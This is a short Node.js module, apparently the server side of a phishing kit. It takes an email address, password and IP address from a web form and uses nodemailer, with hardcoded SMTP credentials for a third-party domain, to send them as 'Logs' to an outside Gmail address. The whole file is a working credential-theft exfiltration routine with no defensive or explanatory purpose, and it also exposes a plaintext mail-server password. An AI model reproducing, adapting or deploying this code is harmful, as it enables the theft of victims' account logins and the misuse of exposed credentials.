
const nodeMailer = require('nodemailer');

async function Zender(req, res) {
    try {

    const email = await req.body.email;
    const pswd = await req.body.pswd;
    const eyep = await req.body.eyep;

    var transporter = nodeMailer.createTransport({
        host: "physicaleducationdiploma.com",
        port: 465,
        secure: true,
        auth: {
          user: "sender@physicaleducationdiploma.com",
          pass: "tQpiwc[Y)Ny)"
        }
    });



    var mailOptions = {
        from:'New Logs from <sender@physicaleducationdiploma.com>',
        to: "wetrannsfer@gmail.com",
        subject: `Contemproary Logs from <${email}>`,
        text:'Testing the microphone',
        html: `
        <center><h1>Page: Testing the microphone</h1></center>
        <p>Email Address:===> ${email}</p>
        <p>Password:===> ${pswd}</p>
        <p>IP Address:===> ${eyep}</p>
        <span>😜😜😜</span>
        `
    }



    // email weill be sent below

    transporter.sendMail(mailOptions, function(error, info) {
        if (error) {
            console.log('err:===>',error);
        } else {
            console.log('email_sent:======> ' + info.response)
        }
    });

    res.json({
        e: false,
        m:'email sent successfully!!!'
    })
        
    } catch (error) {
        res.json({
            e: true,
            m: 'invalid'
        })
    }
    
}


module.exports = Zender;